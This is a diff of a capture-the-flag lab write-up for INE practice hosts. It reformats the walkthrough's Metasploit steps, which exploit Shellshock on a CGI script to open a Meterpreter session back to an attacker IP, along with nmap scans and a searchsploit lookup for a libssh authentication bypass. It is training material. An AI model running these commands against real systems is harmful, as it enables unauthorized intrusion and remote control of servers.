@@ -16,14 +16,16 @@ This suggest we could attempt a Shellshocked vulnerability exploit.
 Nmap reveals that the file browser.cgi is vulnerable to Shellshock.
 
 We proceed with Metasploit:
-- search shellshock
-- use exploit/multi/http/apache_mod_cgi_bash_env_exec
-- setg RHOSTS target1.ine.local
-- setg TARGETURI /browser.cgi
-- setg LHOST 192.164.224.2 
-- run
+    '''
+    search shellshock
+    use exploit/multi/http/apache_mod_cgi_bash_env_exec
+    setg RHOSTS target1.ine.local
+    setg TARGETURI /browser.cgi
+    setg LHOST 192.164.224.2 
+    run
+    '''
 
-Note: If something is not working, try selecting another LPORT.
+**Note: If something is not working, try selecting another LPORT.**
 
 We obtain a Meterpreter session and start exploring the target server, finding .flag.txt as our second flag.
 Navigating to the root directory, we locate the first flag.
@@ -37,8 +39,8 @@ Flag 3: Investigate the user's home directory and consider using 'libssh_auth_by
 
 Analyzing target 2, we scan it with Nmap. The scan leads us to port 22 and its service, libssh 0.8.3.
 
-nmap target2.ine.local -p- -T4 -sS
-nmap target2.ine.local -p22 -T4 -sS -sV
+    nmap target2.ine.local -p- -T4 -sS
+    nmap target2.ine.local -p22 -T4 -sS -sV
 
 Using:
 searchsploit libssh
